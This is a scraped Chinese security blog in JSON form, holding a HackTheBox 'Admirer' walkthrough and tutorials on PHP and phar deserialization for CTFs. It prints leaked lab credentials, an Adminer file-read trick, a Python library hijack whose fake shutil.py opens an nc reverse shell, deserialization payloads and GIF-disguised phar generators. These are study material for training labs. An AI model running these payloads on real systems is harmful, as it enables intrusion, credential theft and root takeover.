brain...&#39;),(9,&#39;images&#x2F;thumbs&#x2F;thmb_eng01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng01.jpg&#39;,&#39;In the name of Science&#39;,&#39;Some theories need to be proven.&#39;),(10,&#39;images&#x2F;thumbs&#x2F;thmb_mus01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus01.jpg&#39;,&#39;Equal Temperament&#39;,&#39;Because without him, music would not exist (as we know it today).&#39;);&#x2F;*!40000 ALTER TABLE &#96;items&#96; ENABLE KEYS *&#x2F;;UNLOCK TABLES;&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;&#x2F;*!40101 SET SQL_MODE&#x3D;@OLD_SQL_MODE *&#x2F;;&#x2F;*!40014 SET FOREIGN_KEY_CHECKS&#x3D;@OLD_FOREIGN_KEY_CHECKS *&#x2F;;&#x2F;*!40014 SET UNIQUE_CHECKS&#x3D;@OLD_UNIQUE_CHECKS *&#x2F;;&#x2F;*!40101 SET CHARACTER_SET_CLIENT&#x3D;@OLD_CHARACTER_SET_CLIENT *&#x2F;;&#x2F;*!40101 SET CHARACTER_SET_RESULTS&#x3D;@OLD_CHARACTER_SET_RESULTS *&#x2F;;&#x2F;*!40101 SET COLLATION_CONNECTION&#x3D;@OLD_COLLATION_CONNECTION *&#x2F;;&#x2F;*!40111 SET SQL_NOTES&#x3D;@OLD_SQL_NOTES *&#x2F;;-- Dump completed on 2019-12-02 20:24:15 解压html.tar.gz 123456789# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html [12:51:51] $ ls -ltotal 28drwxr-x--- 6 kali kali 4096 6月 7 2019 assetsdrwxr-x--- 4 kali kali 4096 12月 3 04:29 images-rw-r----- 1 kali kali 4613 12月 4 04:20 index.php-rw-r----- 1 kali kali 134 12月 2 05:31 robots.txtdrwxr-x--- 2 kali kali 4096 12月 3 01:50 utility-scriptsdrwxr-x--- 2 kali kali 4096 12月 3 01:25 w4ld0s_s3cr3t_d1r utility-scripts目录下的文件 123456789# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:54] $ ls -latotal 24drwxr-x--- 2 kali kali 4096 12月 3 01:50 .drwx------ 6 kali kali 4096 5月 20 14:29 ..-rw-r----- 1 kali kali 1795 12月 3 01:48 admin_tasks.php-rw-r----- 1 kali kali 401 12月 2 06:28 db_admin.php-rw-r----- 1 kali kali 20 11月 30 03:32 info.php-rw-r----- 1 kali kali 53 12月 3 01:40 phptest.php admin_tasks.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;html&gt;&lt;head&gt; &lt;title&gt;Administrative Tasks&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt; &lt;?php // Web Interface to the admin_tasks script // if(isset($_REQUEST[&#x27;task&#x27;])) &#123; $task = $_REQUEST[&#x27;task&#x27;]; if($task == &#x27;1&#x27; || $task == &#x27;2&#x27; || $task == &#x27;3&#x27; || $task == &#x27;4&#x27; || $task == &#x27;5&#x27; || $task == &#x27;6&#x27; || $task == &#x27;7&#x27;) &#123; /*********************************************************************************** Available options: 1) View system uptime 2) View logged in users 3) View crontab (current user only) 4) Backup passwd file (not working) 5) Backup shadow file (not working) 6) Backup web data (not working) 7) Backup database (not working) NOTE: Options 4-7 are currently NOT working because they need root privileges. I&#x27;m leaving them in the valid tasks in case I figure out a way to securely run code as root from a PHP page. ************************************************************************************/ echo str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;)); &#125; else &#123; echo(&quot;Invalid task.&quot;); &#125; &#125; ?&gt; &lt;p&gt; &lt;h4&gt;Select task:&lt;/p&gt; &lt;form method=&quot;POST&quot;&gt; &lt;select name=&quot;task&quot;&gt; &lt;option value=1&gt;View system uptime&lt;/option&gt; &lt;option value=2&gt;View logged in users&lt;/option&gt; &lt;option value=3&gt;View crontab&lt;/option&gt; &lt;option value=4 disabled&gt;Backup passwd file&lt;/option&gt; &lt;option value=5 disabled&gt;Backup shadow file&lt;/option&gt; &lt;option value=6 disabled&gt;Backup web data&lt;/option&gt; &lt;option value=7 disabled&gt;Backup database&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; db_admin.php 1234567891011121314151617&lt;?php $servername = &quot;localhost&quot;; $username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;; // Create connection $conn = new mysqli($servername, $username, $password); // Check connection if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; echo &quot;Connected successfully&quot;; // TODO: Finish implementing this or find a better open source alternative?&gt; info.php 1&lt;?php phpinfo(); ?&gt; phptest.php 123&lt;?php echo(&quot;Just a test to see if PHP works.&quot;);?&gt; 暴露了一个数据库的用户名和密码。但是后面的注释提示a better open source alternative，用wfuzz扫描该目录： 123456789101112131415161718192021222324# kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:55] $ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2ZWarning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.********************************************************* Wfuzz 2.4.5 - The Web Fuzzer *********************************************************Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2ZTotal requests: 61419&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ID Response Lines Word Chars Payload&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;000005617: 200 51 L 235 W 4156 Ch &quot;adminer - php&quot;000028852: 200 964 L 4976 W 84023 Ch &quot;info - php&quot;000041602: 200 0 L 8 W 32 Ch &quot;phptest - php&quot;Total time: 266.5721Processed Requests: 61419Filtered Requests: 61416Requests&#x2F;sec.: 230.4028 访问http://10.10.10.178/utility-scripts/adminer.php Getting User Access 用之前得到的用户名和密码尝试登录失败，Google Adminer database manager，得到一种利用方式： Serious Vulnerability Discovered in Adminer database Administration Tool 简单来讲就是，先配置本地的MySQL数据库，允许远程连接登录，然后用靶机上的adminer database manager连接我们本地的数据库，再将靶机的敏感文件通过adminer写入数据库，最后从本地读取敏感文件。 在kali上用root登录MySQL，新建一个数据库： 1MariaDB [(none)]&gt; CREATE DATABASE admirer; 创建一个用户，如果想让该用户可以从任意远程主机登陆，可以使用通配符% 1MariaDB [(none)]&gt; CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;; 给新用户授权： 1MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO &#x27;demo&#x27;@&#x27;%&#x27;; 重新加载权限： 1MariaDB [(none)]&gt; FLUSH PRIVILEGES; 创建新数据表test： 1MariaDB [(admirer)]&gt; create table test(data VARCHAR(255)); 配置数据库使得能远程连接，修改/etc/mysql/mariadb.conf.d/50-server.cnf 1bind-address &#x3D;0.0.0.0 重启MySQL服务： 1systemctl restart mysql 在本地验证能否登录： 1234567891011$ mysql -h localhost -u demo -pEnter password: Welcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 42Server version: 10.3.22-MariaDB-1 Debian buildd-unstableCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [(none)]&gt; 成功登录，在adminer页面远程登录： It Work！！！ 验证能否使用load data infile语句读取文件： 123load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;into table testfields terminated by &quot;&#x2F;n&quot; 看一下phpinfo()： open_basedir限制了根路径，尝试读取index.php文件： 读取成功，用Select语句显示： 得到waldo: &amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;凭证用来登录SSH 12345678910111213141516$ ssh waldo@10.10.10.187waldo@10.10.10.187&#39;s password: Linux admirer 4.9.0-12-amd64 x86_64 GNU&#x2F;LinuxThe programs included with the Devuan GNU&#x2F;Linux system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Devuan GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.You have new mail.Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3waldo@admirer:~$ iduid&#x3D;1000(waldo) gid&#x3D;1000(waldo) groups&#x3D;1000(waldo),1001(admins)waldo@admirer:~$ cat user.txt 7222------------------------2c18 Getting Root Access 查看waldo能运行的脚本或程序 1234567waldo@admirer:~$ sudo -l[sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh admin_tasks.sh 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/bin/bashview_uptime()&#123; /usr/bin/uptime -p&#125;view_users()&#123; /usr/bin/w&#125;view_crontab()&#123; /usr/bin/crontab -l&#125;backup_passwd()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot; /bin/cp /etc/passwd /var/backups/passwd.bak /bin/chown root:root /var/backups/passwd.bak /bin/chmod 600 /var/backups/passwd.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_shadow()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot; /bin/cp /etc/shadow /var/backups/shadow.bak /bin/chown root:shadow /var/backups/shadow.bak /bin/chmod 600 /var/backups/shadow.bak echo &quot;Done.&quot; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_web()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;backup_db()&#123; if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running mysqldump in the background, it may take a while...&quot; #/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp; /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi&#125;# Non-interactive way, to be used by the web interfaceif [ $# -eq 1 ]then option=$1 case $option in 1) view_uptime ;; 2) view_users ;; 3) view_crontab ;; 4) backup_passwd ;; 5) backup_shadow ;; 6) backup_web ;; 7) backup_db ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esac exit 0fi# Interactive way, to be called from the command lineoptions=(&quot;View system uptime&quot; &quot;View logged in users&quot; &quot;View crontab&quot; &quot;Backup passwd file&quot; &quot;Backup shadow file&quot; &quot;Backup web data&quot; &quot;Backup DB&quot; &quot;Quit&quot;)echoecho &quot;[[[ System Administration Menu ]]]&quot;PS3=&quot;Choose an option: &quot;COLUMNS=11select opt in &quot;$&#123;options[@]&#125;&quot;; do case $REPLY in 1) view_uptime ; break ;; 2) view_users ; break ;; 3) view_crontab ; break ;; 4) backup_passwd ; break ;; 5) backup_shadow ; break ;; 6) backup_web ; break ;; 7) backup_db ; break ;; 8) echo &quot;Bye!&quot; ; break ;; *) echo &quot;Unknown option.&quot; &gt;&amp;2 esacdoneexit 0 在几个需要root权限运行的函数中，backup_web()调用了同目录下的backup.py脚本文件。 backup.py 123456789101112#!/usr/bin/python3from shutil import make_archivesrc = &#x27;/var/www/html/&#x27;# old ftp directory, not used anymore#dst = &#x27;/srv/ftp/html&#x27;dst = &#x27;/var/backups/html&#x27;make_archive(dst, &#x27;gztar&#x27;, src) 这里引用了shutil模块中的make_archive函数，这个地方得用Python库劫持的方法提权： https://rastating.github.io/privilege-escalation-via-python-library-hijacking/ 查看当前Python库的路径： 12345678waldo@admirer:&#x2F;opt&#x2F;scripts$ python3 -c &#39;import sys; print (&quot;\\n&quot;.join(sys.path))&#39;&#x2F;usr&#x2F;lib&#x2F;python35.zip&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;plat-x86_64-linux-gnu&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;lib-dynload&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;dist-packages&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages 但是我们都没有权限写入文件到这些路径，但是我们可以使用PYTHONPATH来临时更改Python库的路径 首先伪造一个shutil.py库文件 123456789waldo@admirer:&#x2F;opt&#x2F;scripts$ cdwaldo@admirer:~$ mkdir fakelibwaldo@admirer:~$ cd fakelib&#x2F;waldo@admirer:~&#x2F;fakelib$ nano shutil.py waldo@admirer:~&#x2F;fakelib$ cat shutil.py import osdef make_archive(a, b, c): os.system(&quot;nc 10.10.14.4 1234 -e &#39;&#x2F;bin&#x2F;sh&#39;&quot;) 靶机运行脚本文件 1234567891011121314waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh [sudo] password for waldo: [[[ System Administration Menu ]]]1) View system uptime2) View logged in users3) View crontab4) Backup passwd file5) Backup shadow file6) Backup web data7) Backup DB8) QuitChoose an option: 6Running backup script in the background, it might take a while... 本机上监听1234端口 123456789101112$ nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.4] from (UNKNOWN) [10.10.10.187] 58946python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# ididuid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# cd cdroot@admirer:~# cat root.txtcat root.txtc6af------------------------4645 ROOTED！！！ 0x04 Summary nmap扫描出 admin-dir目录，访问发现403 Forbidden 使用wfuzz工具扫描出 contacts.txt 和credentials.txt两个文件 用credentials.txt文件暴露出来的FTP用户名和密码登录靶机FTP服务 下载dump.sql文件和html.tar.gz并解压 utility-scripts目录中有MySQL的登录名和密码 wfuzzutility-scripts目录发现 adminer.php 上面用户名和密码不能登录adminer Google发现一个adminer漏洞的公开利用方式 在本地运行MySQL服务，并且新建用户允许任意主机接入，配置MySQL外部可访问 用靶机的adminer服务连接本地数据库 将index.php写入本地数据库 得到waldo的用户名和密码，用SSH登录 拿到user.txt 运行sudo -l命令，查看有权限执行的脚本admin_task.sh admin_task.sh会调用backup.py Python library path hijacking 提权 伪造shutil.py，写入reverse shell sudo运行admin_task.sh时指定 PYTHONPATH 拿到 root.txt 0x05 Reference Topic Url Adminer-database Manager https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool Adminer-Database Manager https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability Configuration of Mysql https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql Configuration of Mysql https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql Python Path Hijacting https://rastating.github.io/privilege-escalation-via-python-library-hijacking/","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"PHP反序列化学习-CTF实战篇","date":"2020-05-14T00:19:57.000Z","path":"Web_security/php_related/7.PHP反序列化学习-CTF实战篇/","text":"PHP反序列化学习之CTF实战篇 网鼎杯2020 AreUserialz 题目地址：https://buuoj.cn/challenges 题目直接给出源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 弱类型比较 分析源码发现可以调用的魔术方法只有__destruct。而$op=2可以读文件，$op=1可以写文件，但是它把$content设置为0说明写这个操作是绝对实用不了了。那么我们把目光放在读文件上。 123456if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;;else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res);&#125; 直接弱类型比较设置$op=2就完事了。然后本来以为可以直接构造pop链开始读文件的。但是遇到了下面的函数： 123456function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; 本来这里是没有什么问题的，但是因为你的变量是protected类型的，所以会产生%00字符，从而导致绕过失败。 绕过is_valid() 这里有两种绕过方法： 1.可以将protected类型的变量设置为public类型（PHP 7.0以上） 12345678910&lt;?phpclass FileHandler&#123; public $op = 2; public $filename = &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;; public $content;&#125;$a = new FileHandler();$b = serialize($a);echo $b; 2.反序列化之前会做逐字判断，ascii必须&gt;=32或&lt;=125。由于这里是protected类型，需要加上%00进行标识，但是%会被过滤，就用十六进制\\00和S来绕过。 1234567891011&lt;?phpclass FileHandler &#123; protected $op = 2; protected $filename = &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php&quot;; protected $content;&#125;$a = new FileHandler();$b = urlencode(serialize($a));echo $b; 然后将payload中的%00替换为\\00，s替换为S就行了 1O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;s:11:&quot;\\00*\\00filename&quot;;s:71:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;N;&#125; 但是用这种方法不能在https://www.ctfhub.com/#/challenge靶机上解题，也拿不到web目录的绝对路径，先留个坑。 ZJCTF2019 逆转思维 题目地址：https://www.ctfhub.com/#/challenge 直接给出源码： 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; file_get_contents绕过 有两种方式绕过： 使用php://input伪协议绕过 ① 将要GET的参数?xxx=php://input ② 用post方法传入想要file_get_contents()函数返回的值 用data://伪协议绕过 将url改为：?xxx=data://text/plain;base64，想要file_get_contents()函数返回的值的base64编码 或者将url改为：?xxx=data:text/plain,(url编码的内容) 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D; 读取useless.php 题目有第二个参数file，大概是include()这个file，题目提示我们要包含useless.php，同时有一个判断是file参数不能传入flag，也就是我们不能直接包含flag.php。 利用php://filter协议读取这个useless.php，构造payload读取useless.php： 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php useless.php 123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;HAHAHAHAHA&quot;); &#125; &#125; &#125; 反序列化 useless.php的魔术方法是__toString()，刚好可以使用echo $password触发这个魔术方法。 生成payload： 123456class Flag&#123; public $file = &quot;flag.php&quot;;&#125;$o = new Flag();$s = serialize($o);echo $s; payload： 1?password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 综合起来的payload就是： 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ByteCTF2019 ezcms 题目地址：https://www.ctfhub.com/#/challenge","tags":[],"categories":[]},{"title":"PHP反序列化学习-Phar反序列化","date":"2020-05-09T02:32:28.000Z","path":"Web_security/php_related/3.PHP反序列化学习-phar反序列化/","text":"PHP反序列化学习——Phar反序列化 Phar原理 phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。 Phar demo 根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。 要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。 phar.php 1234567891011121314&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o-&gt;data = &#x27;ca01h&#x27;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); 访问后,会生成一个phar.phar在当前目录下。 可以明显的看到meta-data是以序列化的形式存储的。 有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，知道创宇测试后受影响的函数列表： 就用比较常用的函数file_get_contents()函数举例： 12345678&lt;?phpclass TestObject&#123; function __destruct() &#123; echo $this -&gt; data; // TODO: Implement __destruct() method. &#125;&#125;file_get_contents(&#x27;phar://phar.phar/test.txt&#x27;); 至于为什么这些函数在解析phar文件时会进行反序列化操作，可以看一下zsf师傅的深层次剖析： https://blog.zsxsoft.com/post/38 在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了php_stream_open_wrapper，都可能触发phar反序列化漏洞。 将Phar伪造成其他格式的文件 在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。 123456789101112&lt;?php class TestObject &#123; &#125; $phar = new Phar(&#x27;img.phar&#x27;); $phar -&gt; startBuffering(); $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); //设置stub，增加gif文件头 $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); //添加要压缩的文件 $object = new TestObject(); $object -&gt; data = &#x27;ca01h&#x27;; $phar -&gt; setMetadata($object); //将自定义meta-data存入manifest $phar -&gt; stopBuffering();?&gt; 采用这种方法可以绕过很大一部分上传检测。 Phar反序列化漏洞利用 漏洞利用条件 phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 Phar简单利用 index.html 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;upload file&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload.php 仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &#x27;.&#x27;)+1))== &#x27;gif&#x27;) &#123; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;else &#123; echo &quot;Invalid file,you can only upload gif&quot;; &#125; evil.php 1234567891011&lt;?phpclass TestObject&#123; var $data = &#x27;echo &quot;Hello World&quot;;&#x27;; function __destruct() &#123; eval($this -&gt; data); &#125;&#125;if ($_GET[&quot;file&quot;])&#123; file_exists($_GET[&quot;file&quot;]);&#125; 绕过思路：GIF格式验证可以通过在文件头部添加GIF89a绕过。 用下面的代码生成phar文件 1234567891011&lt;?phpclass TestObject&#123;&#125;$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new TestObject();$o-&gt;data = &quot;phpinfo()&quot;;$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); 生成的phar.phar修改后缀名phar.gif，再上传该文件，用phar协议解析： 